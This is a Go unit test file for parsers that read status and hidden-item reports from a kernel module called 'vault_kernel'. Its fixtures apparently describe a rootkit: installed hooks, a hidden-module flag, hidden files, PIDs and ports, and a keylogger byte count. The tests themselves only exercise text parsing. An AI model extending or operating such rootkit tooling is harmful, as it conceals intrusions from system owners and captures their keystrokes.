package ioctl

import (
	"encoding/json"
	"reflect"
	"testing"
)

// statsReportFixture is the EXACT text IOCTL_GET_STATS emits (the
// snprintf block in src/ioctl.c) for a module with all 7 hooks, one
// hidden file, one hidden PID and one hidden port.
const statsReportFixture = "module=vault_kernel version=3.8\n" +
	"hooks_installed=7 hooks_planned=7\n" +
	"module_hidden=0\n" +
	"hidden_files=1 hidden_pids=1 hidden_ports=1\n" +
	"keylog_bytes=0\n" +
	"uptime_s=42\n"

func TestParseStatsReportKernelFixture(t *testing.T) {
	got := ParseStatsReport(statsReportFixture)

	want := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.8",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "0",
		"uptime_s":        "42",
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("ParseStatsReport mismatch:\n got: %#v\nwant: %#v", got, want)
	}
}

// Regression for the v3.4/v3.5 line-based parser: every pair after the
// first on a line used to be swallowed into the previous value.
func TestParseStatsReportKeepsAllPairsOfALine(t *testing.T) {
	got := ParseStatsReport("module=vault_kernel version=3.8\n")
	if got["module"] != "vault_kernel" {
		t.Errorf("module = %q, want %q", got["module"], "vault_kernel")
	}
	if got["version"] != "3.8" {
		t.Errorf("version = %q, want %q (line parser lost this key)", got["version"], "3.8")
	}
}

func TestParseStatsReportEdgeCases(t *testing.T) {
	if got := ParseStatsReport(""); len(got) != 0 {
		t.Errorf("empty report should give empty map, got %#v", got)
	}
	if got := ParseStatsReport("no pairs here\n\n"); len(got) != 0 {
		t.Errorf("report without '=' should give empty map, got %#v", got)
	}
	// A token whose '=' is the first byte has no key and must be ignored.
	got := ParseStatsReport("=orphan real=yes")
	if len(got) != 1 || got["real"] != "yes" {
		t.Errorf("'=orphan real=yes' -> %#v, want only real=yes", got)
	}
	// Only the FIRST '=' of a token separates: values may contain '='.
	if got := ParseStatsReport("a=b=c"); got["a"] != "b=c" {
		t.Errorf("a=b=c -> %q, want b=c", got["a"])
	}
}

func TestParseHiddenListKernelFixture(t *testing.T) {
	report := "--- Hidden PIDs ---\n" +
		"  pid: 1234\n" +
		"  pid: 567\n" +
		"--- Hidden Files ---\n" +
		"  secret.txt\n" +
		"  my dir/with space.txt\n" +
		"--- Hidden Ports ---\n" +
		"  port: 8080\n"

	got := ParseHiddenList(report)
	want := HiddenList{
		PIDs:  []int{1234, 567},
		Files: []string{"secret.txt", "my dir/with space.txt"},
		Ports: []int{8080},
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("ParseHiddenList mismatch:\n got: %#v\nwant: %#v", got, want)
	}
}

// A file literally named like a pid/port entry must stay a file name —
// section context decides, never the entry text.
func TestParseHiddenListFileNamedLikeEntry(t *testing.T) {
	report := "--- Hidden PIDs ---\n" +
		"--- Hidden Files ---\n" +
		"  pid: 5\n" +
		"  port: 80\n" +
		"--- Hidden Ports ---\n"
	got := ParseHiddenList(report)
	if len(got.PIDs) != 0 || len(got.Ports) != 0 {
		t.Errorf("entries under Files leaked into other sections: %#v", got)
	}
	if !reflect.DeepEqual(got.Files, []string{"pid: 5", "port: 80"}) {
		t.Errorf("Files = %#v, want [pid: 5 port: 80]", got.Files)
	}
}

func TestParseHiddenListEmptyReport(t *testing.T) {
	got := ParseHiddenList("--- Hidden PIDs ---\n--- Hidden Files ---\n--- Hidden Ports ---\n")
	if len(got.PIDs) != 0 || len(got.Files) != 0 || len(got.Ports) != 0 {
		t.Errorf("empty sections should stay empty, got %#v", got)
	}

	// Slices must be non-nil so JSON shows [] instead of null.
	j, err := json.Marshal(got)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if string(j) != `{"pids":[],"files":[],"ports":[]}` {
		t.Errorf("empty JSON = %s, want {\"pids\":[],\"files\":[],\"ports\":[]}", j)
	}
}

func TestParseHiddenListSkipsGarbageNumbers(t *testing.T) {
	report := "--- Hidden PIDs ---\n" +
		"  pid: notanumber\n" +
		"  pid: 99\n" +
		"--- Hidden Ports ---\n" +
		"  port: \n" +
		"  port: 4711\n"
	got := ParseHiddenList(report)
	if !reflect.DeepEqual(got.PIDs, []int{99}) {
		t.Errorf("PIDs = %#v, want [99]", got.PIDs)
	}
	if !reflect.DeepEqual(got.Ports, []int{4711}) {
		t.Errorf("Ports = %#v, want [4711]", got.Ports)
	}
}
